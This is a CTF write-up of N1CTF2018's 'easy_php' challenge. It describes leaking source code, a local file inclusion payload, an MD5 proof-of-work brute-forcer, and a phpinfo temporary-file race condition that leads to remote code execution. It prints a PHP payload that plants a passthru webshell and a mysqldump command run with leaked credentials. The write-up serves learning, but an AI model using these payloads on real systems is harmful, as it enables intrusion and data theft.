---
title: "PHP : Winning the race against PHP (alternative way to easy_php @ N1CTF2018)"
date: "2018-03-12T04:28:22.000Z"
lastmod: "2019-08-16T01:19:30.000Z"
tags: ["ctf", "web security", "c1ctf2018"]
images: ["/content/images/2018/03/phphamer.jpg"]
slug: "php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018"
url: "/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/"
---
This weekend I and @[shrimpgo](https://www.linkedin.com/in/renatocarneirop/) decided to try some CTF, noticed that [N1CTF2018](http://n1ctf.xctf.org.cn/) are running. Quickly joined and there's a lot of challenges, but this unsolved **easy php** called our attention.

![](/content/images/2018/03/Selection_070.png)

I doubt it was easy, several hours of CTF had already passed and it remained unsolved.

## Challenge details

```
Not racing, just enjoying the slow pace of life :)  
http://47.97.221.96, Mirror: http://47.97.221.96:23333/
```

**Dockerfile**

```bash
FROM andreisamuilik/php5.5.9-apache2.4-mysql5.5

ADD nu1lctf.tar.gz /app/  
RUN apt-get update  
RUN a2enmod rewrite  
COPY sql.sql /tmp/sql.sql  
COPY run.sh /run.sh  
RUN mkdir /home/nu1lctf  
COPY clean_danger.sh /home/nu1lctf/clean_danger.sh

RUN chmod +x /run.sh  
RUN chmod 777 /tmp/sql.sql  
RUN chmod 555 /home/nu1lctf/clean_danger.sh

EXPOSE 80  
CMD ["/run.sh"]
```

## Enumeration

Starting the enumeration of provided web service.

![](/content/images/2018/03/Selection_072.png)

There's a login page, If you try to log in with any credential you will receive the `code error` message. And apparently the username/password check is not even executed.

Ok, they are leaking this sentence `Code(substr(md5(?), 0, 5) === b5152)`, looks like part of code checking function.. checking only the **first 5 bytes** of md5("code"). And this 5 bytes changes on every refresh.

> You need to solve a **Proof-Of-Work**, send the result with the login request. I believe they did this to minimize brute-force abuse. Very common in CTF challenges.

So, I leave this aside and continued my enumeration...

### Source code leaking

By brute-forcing **common filenames and directories** we was able to leak the entire source code of the web application:

```bash
# Web application files & scripts
http://47.97.221.96:23333/index.php  
http://47.97.221.96:23333/config.php  
http://47.97.221.96:23333/user.php  
http://47.97.221.96:23333/static

# Backup files leaking the source code
http://47.97.221.96:23333/index.php~  
http://47.97.221.96:23333/config.php~  
http://47.97.221.96:23333/user.php~

# PHP scripts without .php extension leaking the views source code
http://47.97.221.96:23333/views  
http://47.97.221.96:23333/views/delete  
http://47.97.221.96:23333/views/index  
http://47.97.221.96:23333/views/login  
http://47.97.221.96:23333/views/profile  
http://47.97.221.96:23333/views/publish  
http://47.97.221.96:23333/views/register

# "Useless" phpinfo() running over command line: <?php system("php -r \"phpinfo();\"") ?>
http://47.97.221.96:23333/views/phpinfo
```

From the **config.php** source code we are able to extract the **mysql user password**.

![](/content/images/2018/03/Selection_075.png)

- MySQL user password: `Nu1L / Nu1Lpassword233334`.

## Local File Inclusion (LFI)

Analyzing the leaked source code we found that `http://47.97.221.96:23333/index.php?action=login` are vulnerable to LFI.

![](/content/images/2018/03/Selection_073.png)

Now we can read any file on the system that our user have permission w/ this payload: `http://47.97.221.96:23333/index.php?action=../../etc/passwd`

![](/content/images/2018/03/Selection_074.png)

The provided **Dockerfile** are showing us some interesting info and **file paths** that we can read using the LFI.

Starting by the `FROM andreisamuilik/php5.5.9-apache2.4-mysql5.5` docker container confirming the version of **php**, **apache and mysql**.

### /run.sh script

```bash
#!/bin/bash
chown www-data:www-data /app -R

if [ "$ALLOW_OVERRIDE" = "**False**" ]; then  
    unset ALLOW_OVERRIDE
else  
    sed -i "s/AllowOverride None/AllowOverride All/g" /etc/apache2/apache2.conf
    a2enmod rewrite
fi

# initialize database
mysqld_safe --skip-grant-tables&  
sleep 5  
## change root password
mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('Nu1Lctf%#~:p') WHERE user='root';FLUSH PRIVILEGES;"  
## restart mysql
service mysql restart  
## execute sql file
mysql -uroot -pNu1Lctf\%\#~\:p < /tmp/sql.sql

## crontab
(while true;do rm -rf /tmp/*;sleep 2;done)&

## rm sql
cd /tmp/  
rm sql.sql  
rm /var/www/phpinfo  
source /etc/apache2/envvars  
tail -F /var/log/apache2/* &  
exec apache2 -D FOREGROUND
```

Found MySQL user password and some system info.

- **MySQL root password**: `root / Nu1Lctf%#~:p`

We also tried to fuzz common paths, /proc's, file descriptors etc.. to get more information about the system.

![](/content/images/2018/03/imaa.png)

Not much found, just confirmed the user are running apache2, cmdline, some log paths that we do not have permission to access and Linux header `Linux df551128a261 3.13.0-30-generic #54-Ubuntu SMP Mon Jun 9 22:45:01 UTC 2014 x86_64`.

The [PHP Filters & wrappers](http://php.net/manual/en/wrappers.php) are also enabled.

```
Registered PHP Streams => https, ftps, compress.zlib, compress.bzip2, php, file, glob, data, http, ftp, phar, zip  
Registered Stream Socket Transports => tcp, udp, unix, udg, ssl, sslv3, tls  
Registered Stream Filters => zlib.*, bzip2.*, convert.iconv.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, dechunk, mcrypt.*, mdecrypt.*
```

But we cannot find a way to use it because the `require_once 'views/'.$_GET['action'];` this `views/` prefix we need to escape with `../` in order to get a **LFI** and it not works with the `php://`. ***(if u know a way, plz tell me)***

## MD5 collision PoW

With all enumerated information about the system and even **without a RCE** we decided to solve the md5 collision to start attacking the login system.

So, the `user.php~` are leaking all the login process details.

![](/content/images/2018/03/Selection_077.png)

Breaking the code into pieces, this `if(substr(md5($_POST['code']),0, 5)!==$_SESSION['code'])` is mandatory to solve in order to poke the register/login credentials checking functions.

![](/content/images/2018/03/Selection_079.png)

This code is stored in `session cookie` we leak the content but cannot control it (yet).

If the system return the `Invalid user name` means that we have sent the correct `code`.

**MD5 first 5 bytes hash collision generator**

We quickly wrote this code to get a valid collision.

```php
<?php  
## MD5 first 5 bytes hash collision generator - solution to easy_php @ N1CTF2018  
# solved by intrd & shrimpgo - p4f team

## 1st create a wordlist: crunch 4 4 1234567890abcdefghijklmnopqrstuvwxyz_ -o file.txt

$_SESSION['code']=$argv["1"];
echo "** searching for: ".$_SESSION['code']."\n";

if ($file = fopen("file.txt", "r")) {  
    while(!feof($file)) {
        $line = trim(fgets($file));
        $_POST['code'] = $line;
        if(substr(md5($_POST['code']),0, 5)===$_SESSION['code']){
            echo "yeah!\n".md5($line);
            echo ":\n".$line."\n";
            die();
        }
    }
    fclose($file);
}
?>
```

![](/content/images/2018/03/Selection_080.png)

## Gaining System Access

Now using the pre-generated code `aklhic` we are able to **create a new user** browsing to `http://47.97.221.96:23333/index.php?action=register`

![](/content/images/2018/03/Selection_082.png)

Nice, logged in.

![](/content/images/2018/03/Selection_083.png)

Browsing the web application features, we can publish some content.. and set the `Allow different ip to login` flag to current user. Nothing more..

..nothing more unless you have the `is_admin=1` flag set on your cookie.

![](/content/images/2018/03/Selection_084.png)

As you can see, this flag enables the file sending option, **a good way to get our RCE**.

#### How to set the is_admin=1?

Code set this flag to 1 if the login/register POST are from the correct IP, I bet it was `127.0.0.1`.

![](/content/images/2018/03/Selection_117.png)

The `get_ip()` function is strictly reading the `REMOTE_ADDR`, I think i cannot spoof this value.

![](/content/images/2018/03/Selection_118.png)

#### Trying session cookie code injection

First idea is inject some `<?php code ?>` on cookie session file that I can launch from LFI.

![](/content/images/2018/03/Selection_085.png)

Now we have more information stored on the cookie file, but only `username` I can control. And this is properly filtered.

![](/content/images/2018/03/Selection_086.png)

This check is blocking invalid usernames. We cannot create a new user with some code on it.

#### Trying SQL injection

So, our next idea is checking for some SQL injection.

![](/content/images/2018/03/Selection_087.png)

The queries are very simple and the Db() controller are not properly filtering this. But the code are.

![](/content/images/2018/03/Selection_088.png)

Sometimes it is converting the type to `(int)` before sending to query. It breaks our SQLi attempts.

In other cases like `insert()` it is filtering using the `preg_match()`.

![](/content/images/2018/03/Selection_089.png)

I think it is possible to bypass the `(int)` sending an `array[]` or something like this, and I'm sure this is vulnerable to SQLi by other ways, but no success on my tries. ***(if you know how to do this plz tell me)***

#### Object Injection? POP Chain?

We know the unserialize + PHP are **ALWAYS VULNERABLE**.

![](/content/images/2018/03/Selection_091.png)

This `unserialize()` of the `mood object` is very suspicious. Mood class does not have any php magic function that we can abuse, but the Db{} has.

![](/content/images/2018/03/Selection_092.png)

Ok, but how trigger this?

![](/content/images/2018/03/Selection_093.png)

I created this serialized object locally to a deep inspection.

```php
<?php  
class Mood{

    public $mood, $ip, $date;

    public function __construct($mood, $ip) {
        $this->mood = $mood;
        $this->ip  = $ip;
        $this->date = time();
    }

    public function getcountry()
    {
        $ip = @file_get_contents("http://ip.taobao.com/service/getIpInfo.php?ip=".$this->ip);
        $ip = json_decode($ip,true);
        return $ip['data']['country'];
    }

    public function getsubtime()
    {
        $now_date = time();
        $sub_date = (int)$now_date - (int)$this->date;
        $days = (int)($sub_date/86400);
        $hours = (int)($sub_date%86400/3600);
        $minutes = (int)($sub_date%86400%3600/60);
        $res = ($days>0)?"$days days $hours hours $minutes minutes ago":(($hours>0)?"$hours hours $minutes minutes ago":"$minutes minutes ago");
        return $res;
    }

}

$_POST['mood'] = 1;
$mood = addslashes(serialize(new Mood((int)$_POST['mood'],"127.0.0.1")));
#$mood = serialize(new Mood((int)$_POST['mood'],"127.0.0.1"));
echo $mood;  
// $mood = unserialize($mood);

// $country = $mood->getcountry();
// print $country;
?>
```

![](/content/images/2018/03/obj.png)

..and confirmed that I only can control the mood id, that one converted to integer before to get inside the serialized object. Again, no injection because the conversion.

#### XSS? SSRF?

Maybe there a PhantomJS or some script browsing to my publications?

> If we are able to trigger a **SSRF**, I was able to craft a POST and set my user as **is_admin=1**!

Nope, we have the Dockerfile showing every system changes, and leaked a lot of things that indicate this is not happening. Also there's a `htmlentities()` and other things filtering our XSS tries, and `javascript:` didn't work outside a `<tag>`.

## Emulating locally the remote environment

After a lot of frustrated tries, we decided to move back to enumeration searching another attack vector.

So, Dockerfile shows us that they used a **public repository** to create the base system for this challenge.

![](/content/images/2018/03/Selection_094.png)

I pulled this to my machine, sync'd everything, got a rootshell on it and started the Container enumeration.

![](/content/images/2018/03/Selection_095.png)

The only things that I cannot sync was of course the `ADD nu1lctf.tar.gz /app/` and   
`COPY sql.sql /tmp/sql.sql` containing the challenge data.

# Unintend way to RCE/Flag

Checking the environment we noticed that the challenger made a mistake(intentionally probably) while removing the `/var/www/phpinfo` folder on `/run.sh` script.

![](/content/images/2018/03/Selection_096.png)

He missed the `-r` and it will leave the folder on environment w/ all its contents!

![](/content/images/2018/03/Selection_098.png)

Nice! Different from that useless `/app/views/phpinfo` that are running over command-line, now we have this `phpinfo();` that we can reach directly from web server and interprets our `GET` and `POST requests`!

![](/content/images/2018/03/Selection_099.png)

#### And, why this `phpinfo()` is dangerous?

Remember the challenge description:

```
Not racing, just enjoying the slow pace of life :)
```

I do not like the slow pace of life and decided to try a well known race condition exploit on it.

- [PHP LFI to arbitratry code execution via rfc1867 file upload temporary files](http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf)

[Gynvael Coldwind](https://twitter.com/gynvael?lang=en) wrote this awesome paper about a Race Condition that can be exploited abusing the PHP File Upload function. Btw our **php5.5.9** is vulnerable to this issue.

![](/content/images/2018/03/Selection_100.png)

In order to exploit this we need to launch a `multi-thread` script to `flood the PHP Job queue w/ junk` and we have a `little time window` to `access this temporary created files` before it was automatically deleted.

![](/content/images/2018/03/Selection_101.png)

> The random_value is later written as 6 digits of k=62 (A-Za-z0-9 charset) numeric
> system, and appended to the "/tmp/php" prefix (unless another directory is set),   
> e.g. /tmp/phpUs7MxA. -- Gynvael

Also found this another paper from [brett.moore@insomniasec.com](mailto: brett.moore@insomniasec.com):

- [LFI with PHPInfo assitance (includes PoC)](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)

I tried to use the **Insomniasec PoC** described on paper but no success, maybe because some chinese server conditions and settings, I don't know what happened.

Instead of troubleshooting that PoC and to learn a new thing, following the **Gynvael** and **Insomniasec** papers we decided to write a new exploit from scratch troubleshooting every step on my local docker environment.

## Final exploit

<script src="https://gist.github.com/intrd/35483ae252c66ee3d11f7acfa7379749.js"></script>

The idea behind this code is generate a lot of junk on headers, cookies, uri and POST all the shit including your `payload.txt` to the phpinfo endpoint.

![](/content/images/2018/03/Selection_103.png)

If the File Upload work, the `phpinfo()` will respond with the `temporary file path`.

![](/content/images/2018/03/Selection_104.png)

You aren't fast enough to access this file before it was processed/deleted by PHP. But the multi-thread script are!

This is the *payload* that will be executed if some thread are fast enought to hit.

```php
<?php $c=fopen('/app/intrd','w');fwrite($c,'<?php passthru($_GET["f"]);?>');?>
```

It will create `/app/intrd`, a webshell that we have access though LFI!

I choose this path because I'm sure this is writable:

![](/content/images/2018/03/Selection_107.png)

But remember..   
We are not at an advantage in this race.

![](/content/images/2018/03/Selection_105.png)

There are a fucking `rm -rf /tmp/*;` running `every 2 seconds` on the system.

We have the worst scenario possible:

- This job deleting everything on /tmp every 2s;
- PHP deleting temporary files after processing.
- Chinese server - Other side of the world for me (Brazil);
- Lot of players bruteforcing the application turning the response insanely slow.

Anyway, why not give a try?

So, I launched my exploit locally.

![](/content/images/2018/03/phpinfo_race_condition_exploit.png)

While the Race Condition exploit are running w/ `50 threads`, I keep checking the existence of my webshell at `/app/intrd`.

![](/content/images/2018/03/Selection_108.png)

And, after a few minutes, it worked like a charm! We got our RCE at the controlled environment.

### China number one

So, when I tried the exploit remote I have not had the same luck `:(`.

Of course the Chinese server are too far from me, and the brazilian ISP sucks a lot, `tracert` indicates that there's a single Embratel node sucking more than 200ms, ending w/ the total ping response `650ms+`.

![](/content/images/2018/03/Selection_110.png)

But it become personal, we would not give up at this point.

![](/content/images/2018/03/Selection_112.png)

So we decided to shorten the distance and travel (virtually) near to China!

![](/content/images/2018/03/Selection_109.png)

Thanks [DigitalOcean](https://m.do.co/c/d9e7f6bd0a56)!

`350ms` now i'm ok to launch my exploit from a VPS hosted on `Bagalore`!

And after about 1 hour trying, finally got my webshell written to the `/app` folder.

![](/content/images/2018/03/Selection_113.png)

I think the players loading the server's CPU with bruteforce shit helped me a lot slow-ling the php queue this time.

I quickly upgrade this RCE to a reverse shell.

![](/content/images/2018/03/Selection_114.png)

### Where's the flag?

So, knowing the docker environment, and excluding the nu1lctf.tar.gz content, that at this point we had already been digging into everything. My bet was the MySQL database.

Remember the `mysql root password` leaked on the beginning? I used this to `dump all the databases to a file` and **greped** for the flag prefix.

```bash
mysqldump -uroot -pNu1Lctf\%\#~\:p --all-databases > /app/intdbs.sql
```

![](/content/images/2018/03/Selection_115.png)

A HUGE win!   
Also, the flag text confirmed the intended way was that first path we were following.

**PHP unserialize + SSRF + CRLF Injection**, Jesus, we have no time to learn this today. Hey, Easy? :p

Learned a lot in a single chall.

Awesome CTF [Nu1L .Cyberpeace](n1ctf.xctf.org.cn/), unfortunately we did not have time to try the other challenges but I'm sure they were as well developed as this one!

And thanks @[shrimpgo](https://www.linkedin.com/in/renatocarneirop/), awesome team up and brainstorms!

# UPDATE: Expected solution (PHP unserialize + SSRF + CRLF Injection)

- [ezphp - official writeup](http://wupco.cn/hctf/ezphp.pdf) by wupcode (admin)

## Resources

- [NICTF 2018](http://n1ctf.xctf.org.cn/)
- [Docker cheat sheet](https://github.com/wsargent/docker-cheat-sheet)
- [OWASP, testing for LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
- [PHP Protocols and Wrappers](http://php.net/manual/en/wrappers.php)
- [Collision attack](https://en.wikipedia.org/wiki/Collision_attack)
- [MD5 Collision demo](https://www.mathstat.dal.ca/~selinger/md5collision/)
- [A simple unit test to show a MD5 hashing collision](https://github.com/binarycoded/md5-collision)
- [OWASP, PHP Object injection](https://www.owasp.org/index.php/PHP_Object_Injection)
- [Race condition](https://en.wikipedia.org/wiki/Race_condition#Example)
- [insomniasec, Pratical PHP Object Injection](https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf)
- [Gynvael Coldwind, PHP LFI RFC1867 Temporary Files](http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf)
- [Insomniasec LFI With PHPInfo Assistsance](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)
